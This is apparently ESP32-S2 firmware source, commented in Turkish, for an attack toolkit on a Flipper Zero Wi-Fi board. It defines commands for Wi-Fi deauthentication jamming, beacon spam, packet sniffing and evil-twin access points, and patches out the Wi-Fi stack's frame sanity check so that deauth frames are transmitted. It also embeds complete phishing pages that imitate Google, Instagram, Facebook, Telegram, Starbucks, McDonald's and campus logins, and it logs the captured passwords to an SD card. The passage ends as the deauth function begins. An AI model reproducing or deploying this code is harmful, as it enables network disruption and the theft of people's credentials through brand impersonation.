/*
 * ============================================================
 * JamFlipper - ESP32-S2 Firmware (Official Wi-Fi Devboard)
 *
 * PIN EŞLEŞMESİ (Official Flipper Wi-Fi Dev Board):
 *   Pin 15 (IO18) -> ESP RX   (Flipper TX, GPIO pin 13'ten gelen)
 *   Pin 16 (IO17) -> ESP TX   (Flipper RX, GPIO pin 14'e giden)
 *
 * PROTOKOL (Flipper → ESP):
 *   CMD:SCAN\n               - Tarama başlat
 *   CMD:STOP\n               - Her şeyi durdur
 *   CMD:WJ,AGR:N,HOP:N\n    - WiFi Jam (AGR: 0-2, HOP: 0-2)
 *   CMD:CJAM,AGR:N,HOP:N,SSID:N,MSG:N,PORTAL:N - Complete Jam
 *   CMD:BSPAM,TYPE:N\n       - Beacon Spam (TYPE: 0=Rndm, 1=Top20, 2=Portal)
 *   CMD:SNIFF,SSID:x,PASS:x  - WiFi Sniff (bağlan + promiscuous → PCAP)
 *   CMD:TSNIFF,SSID:x,PASS:x,MAC:XX:XX:XX:XX:XX:XX - Targeted Sniff
 *   CMD:EVILTWIN,SSID:x,CH:N,BSSID:XX:XX:XX:XX:XX:XX,CLONE:N - Evil Twin
 *   CMD:GLOGIN,SSID:x        - Public G-Login beacon portal
 *   CMD:TGLOGIN,SSID:x,CH:N,BSSID:XX:XX:XX:XX:XX:XX,CLONE:N - Targeted G-Login
 *   CMD:REBOOT\n             - ESP'yi yeniden başlat
 *
 * PROTOKOL (ESP → Flipper):
 *   STATUS:BOOT|JamFlipper Ready
 *   STATUS:SCANNING|Found:N APs
 *   STATUS:SCAN_DONE|Found N APs
 *   STATUS:WIFI_JAM|Deauth:N CH:N
 *   STATUS:BEACON_SPAM|Count:N
 *   STATUS:SNIFF|Pkts:N CH:N SSID:<ssid>
 *   STATUS:TARGET_SNIFF|Pkts:N MAC:<mac>
 *   STATUS:EVIL_TWIN|Deauth:N Portal:N SSID:<ssid>
 *   STATUS:G_LOGIN|Clients:N SSID:<ssid>
 *   STATUS:TARGET_GLOGIN|Deauth:N Portal:N SSID:<ssid>
 *   STATUS:IDLE|Stopped.
 *   LOG:Found "SSID" on CHN
 *   LOG:EVILTWIN_PASS|<wifi-password>   ← SD karta kaydedilir
 *   LOG:GLOGIN_DATA|email=...&pass=...  ← SD karta kaydedilir
 *   LOG:Error message
 *
 * DÜZELTILEN HATALAR (orijinal koddan):
 *   1. WiFi.mode(WIFI_STA) yerine WIFI_MODE_STA kullanılıyordu (Arduino API hatası)
 *   2. Beacon frame offset 36 yerine 40'tan başlıyor (802.11 Fixed Parameters)
 *   3. Jam modunda esp_wifi_set_promiscuous(true) eksikti (raw TX için şart)
 *   4. Deauth frame SA alanı sıfır başlıyordu, BSSID ile doldurulmuyor
 *   5. esp_wifi_start() çağrısı WiFi.mode()'dan sonra çift başlatıyordu
 *   6. Scan + Jam aynı anda yönetilmiyordu (mod geçişleri eksikti)
 *   7. Beacon frame random MAC sadece 3 byte üretiyordu (6 byte lazım)
 * ============================================================
 */

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiAP.h>
#include <WiFiClient.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_event.h>
#include <esp_netif.h>      // DHCP Option 114 için
#include <lwip/netif.h>     // netif_input_fn, struct netif
#include <lwip/pbuf.h>      // struct pbuf
#include <lwip/err.h>       // err_t, ERR_OK
#include <string.h>
#include "jam_flipper_types.h"

// ─── KRITIK: IEEE 802.11 Raw Frame Sanity Check Bypass ──────
// ESP-IDF Wi-Fi stack'i (libnet80211.a) management frame
// gönderimini sessizce engelliyor. Bu override ile bypass.
// !!! Derleme sırasında -Wl,-zmuldefs linker flag'i GEREKLİ !!!
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0; // Her zaman "geçerli frame" döndür → deauth artık havaya verilecek
}

// ─── Global Değişkenler ───────────────────────────────────────
static AttackMode  g_mode         = MODE_IDLE;
static bool        g_running      = false;
static uint8_t     g_aggression   = 0;   // 0=Low(3), 1=Med(8), 2=High(20)
static uint8_t     g_hop_speed    = 0;   // 0=Fast(50ms), 1=Normal(100ms), 2=Slow(200ms)
static uint8_t     g_beacon_type  = 0;   // 0=Random, 1=Top20, 2=Portal
static uint8_t     g_scan_type    = 0;   // 0=Basic, 1=Logged(PCAP)

static APRecord    g_aps[MAX_APS];
static int         g_ap_count     = 0;
static uint32_t    g_deauth_count = 0;
static uint32_t    g_beacon_count = 0;
static uint8_t     g_current_ch   = 1;
static uint32_t    g_last_hop     = 0;
static uint32_t    g_last_status  = 0;

static char        g_cmd_buf[CMD_BUF_SIZE];
static int         g_cmd_idx      = 0;

// ─── Yeni Mod Değişkenleri ────────────────────────────────────
// Sniff modu
static char        g_sniff_ssid[33]        = "";
static char        g_sniff_pass[64]        = "";
static uint8_t     g_target_mac[6]         = {0};  // Target sniff için MAC filtresi
static bool        g_target_mac_active     = false;
static uint32_t    g_sniff_pkt_count       = 0;   // Yakalanan toplam paket
static uint32_t    g_sniff_sent_count      = 0;   // UART'a gönderilen paket
static bool        g_sniff_connected       = false;
static uint32_t    g_sniff_last_pcap_ms    = 0;   // Rate-limiter: son PCAP gönderim

// Evil Twin / G-Login modu
static char        g_evil_ssid[33]         = "";
static uint8_t     g_evil_channel          = 6;
static uint8_t     g_evil_bssid[6]         = {0};
static bool        g_clone_mac             = false; // true ise hedef AP'nin MAC'i klonlanır
static bool        g_ssid_lookalike        = false; // true ise SSID'ye '.' eklenir (Lookalike modu)
static uint8_t     g_factory_ap_mac[6]     = {0};   // Fabrika AP MAC (startup'ta kaydedilir)

// SSID listeleri
static const char* TOP20_SSIDS[] = {
    "FREE_WIFI", "Starbucks_WiFi", "iPhone", "Guest_Network",
    "NETGEAR_5G", "Airport_WiFi", "McDonalds_Free", "TurkTelekom_WiFi",
    "Vodafone_Guest", "Home_Network", "AndroidAP", "TP-LINK_Guest",
    "HUAWEI-Guest", "xfinitywifi", "ATT-WIFI", "SBG_Guest",
    "BTHub-Guest", "Virgin_Media", "SKY_Guest", "EE-WiFi"
};
#define TOP20_COUNT 20

static const char* PORTAL_MSGS[] = {
    "System Update Required", "Free WiFi - Login to Continue",
    "Network Maintenance", "Authentication Required",
    "Guest Portal", "Click to Connect"
};
#define PORTAL_COUNT 6

// Beacon isim üretici için sayaç
static uint16_t g_beacon_idx = 0;

// ─── Custom SSID Depolama ────────────────────────────────────
static char     g_custom_ssids[MAX_CUSTOM_SSIDS][PORTAL_SSID_MAX];
static uint8_t  g_custom_ssid_count = 0;

// ─── Captive Portal Değişkenleri ──────────────────────────────
// DNSServer + WebServer kullanımı (Evil Portal standart yaklaşımı)
static DNSServer*  g_dns_server   = NULL;
static WebServer*  g_web_server   = NULL;
static bool        g_portal_active = false;
static uint8_t     g_portal_type   = 0;  // 0=Update, 1=FreeWiFi, 2=Maint, 3=Auth
static char        g_portal_ssid[PORTAL_SSID_MAX] = "Free_WiFi";
static uint32_t    g_portal_clients = 0;
static IPAddress   g_portal_ip(192, 168, 4, 1);

// ─── Portal HTML Sayfaları (PROGMEM) ─────────────────────────
// Ortak CSS stili (tüm sayfalar için)
static const char PORTAL_CSS[] PROGMEM = R"rawliteral(
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,system-ui,sans-serif;background:#0a0a1a;color:#e0e0e0;min-height:100vh;display:flex;align-items:center;justify-content:center}
.box{background:linear-gradient(135deg,#1a1a3e,#252550);border-radius:16px;padding:32px;max-width:400px;width:90%;box-shadow:0 8px 32px rgba(0,0,0,.5);text-align:center;border:1px solid rgba(100,100,255,.15)}
h1{font-size:22px;margin-bottom:12px}
p{font-size:14px;color:#a0a0c0;margin-bottom:20px}
input{width:100%;padding:12px;border-radius:8px;border:1px solid #333;background:#12122a;color:#fff;font-size:14px;margin-bottom:12px}
btn,.btn{display:block;width:100%;padding:14px;border-radius:8px;border:none;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
.btn-p{background:linear-gradient(135deg,#4a6cf7,#6366f1);color:#fff}
.btn-p:hover{opacity:.9}
.bar{height:6px;background:#1a1a3e;border-radius:3px;margin:16px 0;overflow:hidden}
.bar-in{height:100%;background:linear-gradient(90deg,#4a6cf7,#22d3ee);width:0%;border-radius:3px;animation:prog 3s ease forwards}
@keyframes prog{to{width:100%}}
.ico{font-size:48px;margin-bottom:16px}
.warn{color:#f59e0b}
.ok{color:#22d3ee}
.err{color:#ef4444}
small{color:#666;font-size:11px;display:block;margin-top:16px}
</style>
)rawliteral";

// Sayfa 0: System Update Required
static const char PAGE_UPDATE[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>System Update</title>%CSS%</head>
<body><div class="box">
<div class="ico warn">⚠️</div>
<h1>System Update Required</h1>
<p>A critical security update is available for your device. Please enter your WiFi password to continue.</p>
<form action="/login" method="POST">
<input type="password" name="pass" placeholder="WiFi Password" required>
<button class="btn btn-p" type="submit">Update Now</button>
</form>
<div class="bar"><div class="bar-in"></div></div>
<small>Security Update v2.4.1 • Required</small>
</div></body></html>
)rawliteral";

// Sayfa 1: Free WiFi Login (Telefon No + Şifre)
static const char PAGE_FREEWIFI[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Free WiFi</title>%CSS%</head>
<body><div class="box">
<div class="ico ok">📶</div>
<h1>Free WiFi - Connect</h1>
<p>Welcome! Enter your phone number and password to access free internet.</p>
<form action="/login" method="POST">
<input type="tel" name="phone" placeholder="Phone Number" required>
<input type="password" name="pass" placeholder="Password" required>
<button class="btn btn-p" type="submit">Connect to Internet</button>
</form>
<small>By connecting you agree to our Terms of Service</small>
</div></body></html>
)rawliteral";

// Sayfa 2: Network Maintenance (Sadece bilgi mesajı, form YOK)
static const char PAGE_MAINT[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Maintenance</title>%CSS%</head>
<body><div class="box">
<div class="ico warn">🔧</div>
<h1>Network Maintenance</h1>
<p>This network is currently undergoing scheduled maintenance. Service will be restored shortly.</p>
<div class="bar"><div class="bar-in"></div></div>
<p>Please try again later. We apologize for the inconvenience.</p>
<small>Estimated downtime: 2-4 hours</small>
</div></body></html>
)rawliteral";

// Sayfa 3: Login Error (Sadece Şifre)
static const char PAGE_AUTH[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login Error</title>%CSS%</head>
<body><div class="box">
<div class="ico err">⚠️</div>
<h1>Incorrect Password</h1>
<p>The password you entered is incorrect. Please try again to reconnect to the network.</p>
<form action="/login" method="POST">
<input type="password" name="pass" placeholder="Network Password" required>
<button class="btn btn-p" type="submit">Reconnect</button>
</form>
<small>If you forgot your password, contact your network administrator.</small>
</div></body></html>
)rawliteral";

// Başarılı giriş sonrası sayfa
static const char PAGE_SUCCESS[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Connected</title>%CSS%</head>
<body><div class="box">
<div class="ico ok">✅</div>
<h1>Connected!</h1>
<p>You are now connected to the network. You may close this page.</p>
<div class="bar"><div class="bar-in"></div></div>
<small>Redirecting...</small>
</div></body></html>
)rawliteral";

// Evil Twin: WiFi şifre toplama sayfası
static const char PAGE_EVILTWIN[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Network</title>%CSS%</head>
<body><div class="box">
<div class="ico warn">🔒</div>
<h1>Session Expired</h1>
<p>Your WiFi session has expired. Please re-enter your network password to restore internet access.</p>
<form action="/login" method="POST">
<input type="password" name="pass" placeholder="WiFi Password" required autocomplete="current-password">
<button class="btn btn-p" type="submit">Reconnect</button>
</form>
<small>Secured Network • WPA2</small>
</div></body></html>
)rawliteral";

// Google Login phishing sayfası (tek form: email + şifre)
static const char PAGE_GLOGIN[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in - Google Accounts</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;color:#202124;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{width:100%;max-width:420px;padding:48px 40px 36px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.15)}
.logo{text-align:center;margin-bottom:20px}
.g{font-size:2rem;font-weight:700;letter-spacing:-1px}
.g .gb{color:#4285F4}.g .go{color:#EA4335}.g .gg{color:#FBBC05}.g .gg2{color:#4285F4}.g .gl{color:#34A853}.g .ge{color:#EA4335}
h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:6px;color:#202124}
.sub{font-size:15px;color:#5f6368;text-align:center;margin-bottom:28px}
.field{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;margin-bottom:14px;background:#fff}
.field:focus{border-color:#1a73e8;border-width:2px}
.forgot{font-size:14px;color:#1a73e8;text-decoration:none;display:inline-block;margin-bottom:28px;font-weight:500}
.actions{display:flex;justify-content:space-between;align-items:center}
.create{font-size:14px;color:#1a73e8;font-weight:500;text-decoration:none}
.next{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:11px 28px;font-size:14px;font-weight:500;cursor:pointer;letter-spacing:.25px}
.next:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.3)}</style></head>
<body><div class="card">
<div class="logo"><div class="g"><span class="gb">G</span><span class="go">o</span><span class="gg">o</span><span class="gg2">g</span><span class="gl">l</span><span class="ge">e</span></div></div>
<h1>Sign in</h1><p class="sub">to continue to Gmail</p>
<form action="/login" method="POST">
<input class="field" type="email" name="email" placeholder="Email or phone" required autocomplete="email">
<input class="field" type="password" name="pass" placeholder="Enter your password" required autocomplete="current-password">
<a href="#" class="forgot">Forgot password?</a>
<div class="actions">
<a href="#" class="create">Create account</a>
<button class="next" type="submit">Next</button>
</div></form></div></body></html>
)rawliteral";

// Instagram Login phishing sayfası
static const char PAGE_IGLOGIN[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Instagram</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafafa;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:3px;padding:40px;width:350px;text-align:center}
.logo{font-size:2.2rem;font-family:'Billabong',cursive;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:24px;font-weight:700;letter-spacing:-1px}
.field{width:100%;padding:9px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;margin-bottom:8px;outline:none;color:#262626}
.field:focus{border-color:#a8a8a8}
.btn{width:100%;padding:8px;background:linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045);color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
.divider{display:flex;align-items:center;margin:18px 0}
.divider:before,.divider:after{content:'';flex:1;border-top:1px solid #dbdbdb}
.divider span{padding:0 16px;font-size:13px;color:#8e8e8e;font-weight:600}
small{color:#8e8e8e;font-size:12px;display:block;margin-top:20px}</style></head>
<body><div class="card">
<div class="logo">Instagram</div>
<form action="/login" method="POST">
<input class="field" type="text" name="email" placeholder="Phone number, username or email" required autocomplete="username">
<input class="field" type="password" name="pass" placeholder="Password" required autocomplete="current-password">
<button class="btn" type="submit">Log in</button>
</form>
<div class="divider"><span>OR</span></div>
<small>Don't have an account? <a href="#" style="color:#0095f6;font-weight:600">Sign up</a></small>
</div></body></html>
)rawliteral";

// Facebook Login phishing sayfası
static const char PAGE_FBLOGIN[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Facebook - Log in or sign up</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh}
.wrap{display:flex;flex-direction:column;align-items:center;max-width:400px;width:100%;padding:20px}
.logo{color:#1877f2;font-size:2.8rem;font-weight:900;margin-bottom:8px;letter-spacing:-1px}
.tagline{font-size:1.1rem;color:#1c1e21;margin-bottom:24px;text-align:center}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;width:100%}
.field{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;outline:none}
.field:focus{border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
.btn{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer}
.btn:hover{background:#166fe5}
.divider{border-top:1px solid #dadde1;margin:20px 0}
.create{display:block;text-align:center;background:#42b72a;color:#fff;padding:14px;border-radius:6px;font-size:17px;font-weight:600;text-decoration:none}
.create:hover{background:#36a420}</style></head>
<body><div class="wrap">
<div class="logo">facebook</div>
<p class="tagline">Facebook helps you connect and share with the people in your life.</p>
<div class="card">
<form action="/login" method="POST">
<input class="field" type="email" name="email" placeholder="Email or phone number" required autocomplete="email">
<input class="field" type="password" name="pass" placeholder="Password" required autocomplete="current-password">
<button class="btn" type="submit">Log in</button>
</form>
<div class="divider"></div>
<a href="#" class="create">Create new account</a>
</div></div></body></html>
)rawliteral";

// Telegram Login phishing sayfası
static const char PAGE_TGMLOGIN[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Telegram Web</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,Roboto,sans-serif;background:#17212b;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#232e3c;border-radius:12px;padding:40px 32px;max-width:380px;width:90%;text-align:center;box-shadow:0 4px 24px rgba(0,0,0,.4)}
.tg-icon{width:80px;height:80px;background:linear-gradient(135deg,#2aabee,#229ed9);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:2rem}
h1{font-size:22px;font-weight:600;margin-bottom:6px}
.sub{font-size:14px;color:#6c7883;margin-bottom:28px}
.field{width:100%;padding:12px 16px;background:#1c2733;border:1px solid #2b5278;border-radius:8px;color:#fff;font-size:15px;margin-bottom:12px;outline:none}
.field:focus{border-color:#2aabee}
.field::placeholder{color:#566778}
.btn{width:100%;padding:13px;background:#2aabee;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
.btn:hover{background:#229ed9}
small{color:#566778;font-size:12px;display:block;margin-top:16px}</style></head>
<body><div class="card">
<div class="tg-icon">📨</div>
<h1>Telegram Web</h1>
<p class="sub">Please confirm your phone number to sign in</p>
<form action="/login" method="POST">
<input class="field" type="tel" name="phone" placeholder="Phone Number (+1 123 456 7890)" required>
<input class="field" type="password" name="pass" placeholder="Password (2FA)" autocomplete="current-password">
<button class="btn" type="submit">Next</button>
</form>
<small>By signing in, you agree to Telegram's Terms of Service.</small>
</div></body></html>
)rawliteral";

// Starbucks Free WiFi captive portal
static const char PAGE_STARBUCKS[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Starbucks WiFi</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Lato',Arial,sans-serif;background:#1e3932;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#fff;border-radius:12px;padding:40px 32px;max-width:380px;width:90%;text-align:center;color:#1e3932;box-shadow:0 8px 32px rgba(0,0,0,.3)}
.logo{font-size:1.6rem;font-weight:900;color:#00704a;margin-bottom:4px;letter-spacing:-0.5px}
.logo span{color:#1e3932}
.subtitle{font-size:13px;color:#56666b;margin-bottom:28px}
.wifi-icon{font-size:3rem;margin-bottom:16px}
h1{font-size:20px;font-weight:700;margin-bottom:8px;color:#1e3932}
.field{width:100%;padding:12px 16px;border:1px solid #d4e9e2;border-radius:6px;font-size:15px;margin-bottom:12px;outline:none;background:#f1f8f6;color:#1e3932}
.field:focus{border-color:#00704a}
.btn{width:100%;padding:13px;background:#00704a;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer}
.btn:hover{background:#005a38}
small{color:#56666b;font-size:11px;display:block;margin-top:16px}</style></head>
<body><div class="card">
<div class="wifi-icon">☕️</div>
<div class="logo">Starbucks <span>WiFi</span></div>
<div class="subtitle">Complimentary in-store WiFi</div>
<h1>Connect to Free WiFi</h1>
<form action="/login" method="POST">
<input class="field" type="email" name="email" placeholder="Email address" required autocomplete="email">
<input class="field" type="tel" name="phone" placeholder="Phone number (optional)">
<button class="btn" type="submit">Connect Free</button>
</form>
<small>By connecting, you agree to the Starbucks Guest WiFi Terms of Use.</small>
</div></body></html>
)rawliteral";

// McDonald's Free WiFi captive portal
static const char PAGE_MCDONALDS[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>McDonald's Free WiFi</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Speedee',Arial,sans-serif;background:#da291c;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#fff;border-radius:16px;padding:36px 28px;max-width:380px;width:90%;text-align:center;color:#292929;box-shadow:0 8px 32px rgba(0,0,0,.3)}
.m-logo{font-size:3rem;margin-bottom:4px}
.logo-text{font-size:1.1rem;font-weight:700;color:#da291c;margin-bottom:4px}
.subtitle{font-size:13px;color:#6d6d6d;margin-bottom:24px}
h1{font-size:18px;font-weight:700;margin-bottom:16px;color:#292929}
.field{width:100%;padding:12px 16px;border:2px solid #ededed;border-radius:8px;font-size:15px;margin-bottom:12px;outline:none}
.field:focus{border-color:#ffc72c}
.btn{width:100%;padding:14px;background:#ffc72c;color:#292929;border:none;border-radius:8px;font-size:16px;font-weight:900;cursor:pointer}
.btn:hover{background:#ffb700}
small{color:#9e9e9e;font-size:11px;display:block;margin-top:16px}</style></head>
<body><div class="card">
<div class="m-logo">🍔</div>
<div class="logo-text">McDonald's Free WiFi</div>
<div class="subtitle">Connect. Enjoy. Repeat.</div>
<h1>Sign in to Get Online</h1>
<form action="/login" method="POST">
<input class="field" type="email" name="email" placeholder="Email address" required autocomplete="email">
<input class="field" type="tel" name="phone" placeholder="Mobile number" required>
<button class="btn" type="submit">👍 I'm Lovin' It - Connect!</button>
</form>
<small>By connecting you accept our WiFi terms. Free for 1 hour per visit.</small>
</div></body></html>
)rawliteral";

// Generic Public WiFi captive portal
static const char PAGE_PUBLICWIFI[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Free Public WiFi</title>%CSS%</head>
<body><div class="box">
<div class="ico ok">📡</div>
<h1>Free Public Wi-Fi</h1>
<p>Welcome! Create a free account to access high-speed internet. No subscription needed.</p>
<form action="/login" method="POST">
<input type="text" name="name" placeholder="Full Name" required>
<input type="email" name="email" placeholder="Email Address" required>
<input type="tel" name="phone" placeholder="Phone Number">
<button class="btn btn-p" type="submit">Connect to Internet</button>
</form>
<small>Free 2-hour session • Powered by CityNet</small>
</div></body></html>
)rawliteral";

// School / Campus WiFi captive portal
static const char PAGE_SCHOOL[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Campus Network Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Arial,sans-serif;background:#1a237e;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#fff;border-radius:12px;padding:36px 28px;max-width:380px;width:90%;text-align:center;color:#1a237e;box-shadow:0 8px 32px rgba(0,0,0,.4)}
.uni-icon{font-size:3rem;margin-bottom:8px}
h1{font-size:20px;font-weight:700;margin-bottom:4px}
.sub{font-size:13px;color:#5c6bc0;margin-bottom:24px}
.field{width:100%;padding:12px 16px;border:1px solid #c5cae9;border-radius:6px;font-size:15px;margin-bottom:12px;outline:none;color:#1a237e}
.field:focus{border-color:#3949ab;box-shadow:0 0 0 2px rgba(57,73,171,.15)}
.btn{width:100%;padding:13px;background:#1a237e;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
.btn:hover{background:#283593}
.forgot{display:block;text-align:center;margin-top:12px;color:#3949ab;font-size:13px;text-decoration:none}
small{color:#9e9e9e;font-size:11px;display:block;margin-top:16px}</style></head>
<body><div class="card">
<div class="uni-icon">🏫</div>
<h1>Campus Network</h1>
<p class="sub">Secure Wi-Fi for students and staff</p>
<form action="/login" method="POST">
<input class="field" type="text" name="student_id" placeholder="Student / Staff ID" required autocomplete="username">
<input class="field" type="password" name="pass" placeholder="Password" required autocomplete="current-password">
<button class="btn" type="submit">🔒 Sign in to Network</button>
</form>
<a href="#" class="forgot">Forgot password? Contact IT support</a>
<small>University Campus Network • Authorized users only</small>
</div></body></html>
)rawliteral";

// ─── 802.11 Frame Şablonları ─────────────────────────────────
//
// Deauth ve Disassoc işlemleri send_deauth içinde dinamik olarak oluşturulacak

// ─── Yardımcı: UART Çıkışı ───────────────────────────────────
static void tx(const char* fmt, ...) {
    char buf[256];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    // Hem Flipper UART hem USB Serial Monitor
    Serial1.print(buf);
    Serial1.print('\n');
    Serial.print(buf);
    Serial.print('\n');
}

// ─── Yardımcı: Parametreden Değer Hesaplama ──────────────────
static int aggr_to_count(void) {
    return (g_aggression == 0) ? 3 : (g_aggression == 1) ? 8 : 20;
}

static uint32_t hop_to_ms(void) {
    /* Normal jamming taraması hızları (50, 100, 200ms).
     * Kullanıcı isteği: Portal aktif olsa bile ağ düşürme (jamming) önceliklidir, 
     * o yüzden eski hızlı kanal taraması sürelerine geri dönüldü. */
    return (g_hop_speed == 0) ? 50 : (g_hop_speed == 1) ? 100 : 200;
}

// ─── 802.11 Raw Frame Gönderme ───────────────────────────────
static uint32_t g_tx_ok_count = 0;
static uint32_t g_tx_err_count = 0;

static void send_raw_frame(uint8_t* frame, int len, bool sys_seq) {
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, sys_seq);
    if(err != ESP_OK) {
        g_tx_err_count++;
        // İlk 10 hatayı logla, sonra her 100'de bir (spam engeli)
        if(g_tx_err_count <= 10 || (g_tx_err_count % 100) == 0) {
            Serial.printf("LOG: TX ERROR #%lu: esp_err=%d (0x%X)\n",
                (unsigned long)g_tx_err_count, err, err);
            tx("LOG:TX_ERR:%d cnt:%lu", err, (unsigned long)g_tx_err_count);
        }
    } else {
        g_tx_ok_count++;
    }
}

// ─── Yardımcı: MAC Locally Administered mi? ─────────────────
// Bit 1 of byte 0 = 1 ise "Locally Administered" (random MAC)
// Modern cihazlar Probe Request'lerde random MAC kullanır.
// Data frame'lerde gerçek MAC kullanılır.
static bool is_locally_administered_mac(const uint8_t* mac) {
    return (mac[0] & 0x02) != 0; // LA bit set
}

// ─── Yeni: AP'ye Client (İstemci) Ekle ──────────────────────
// only_global: true ise sadece globally-unique (gerçek) MAC'leri ekle
static void add_client_to_ap(APRecord* ap, uint8_t* mac, bool only_global) {
    if(mac[0] & 0x01) return; // Multicast/Broadcast MAC ise yoksay
    if(memcmp(ap->bssid, mac, 6) == 0) return; // AP'nin kendisini ekleme
    
    // Tüm sıfır veya tüm FF MAC'leri yoksay
    uint8_t zero_mac[6] = {0};
    uint8_t ff_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    if(memcmp(mac, zero_mac, 6) == 0 || memcmp(mac, ff_mac, 6) == 0) return;
    
    // Random MAC filtresi: only_global modda locally-administered MAC'leri atla
    if(only_global && is_locally_administered_mac(mac)) return;

    for(int i = 0; i < ap->client_count; i++) {
        if(memcmp(ap->clients[i].mac, mac, 6) == 0) return; // Zaten kayıtlı
    }
    
    if(ap->client_count < 8) {
        memcpy(ap->clients[ap->client_count].mac, mac, 6);
        ap->clients[ap->client_count].selected = false; // Flipper seçene kadar false
        ap->client_count++;
    } else {
        // Liste doluysa en eskisini silip güncel olanı sona ekle
        for(int i = 1; i < 8; i++) {
            memcpy(ap->clients[i-1].mac, ap->clients[i].mac, 6);
            ap->clients[i-1].selected = ap->clients[i].selected;
        }
        memcpy(ap->clients[7].mac, mac, 6);
        ap->clients[7].selected = false;
    }
}

// ─── Deauth Gönderme (Düzeltilmiş) ──────────────────────────
//
// ÖNEMLİ DEĞİŞİKLİKLER:
//   1. esp_wifi_set_mac() KALDIRILDI — raw TX'e etkisi yok,
//      race condition yaratıyordu
//   2. Hem Deauth (0xC0) hem Disassoc (0xA0) gönderiliyor
//   3. Birden fazla reason code kullanılıyor
//   4. Her iki yön de (AP→Client, Client→AP) gönderiliyor
//   5. Sanity check bypass ile artık frame'ler gerçekten havaya veriliyor
//
static void send_deauth(const APRecord* ap, bool broadcast_ok) {
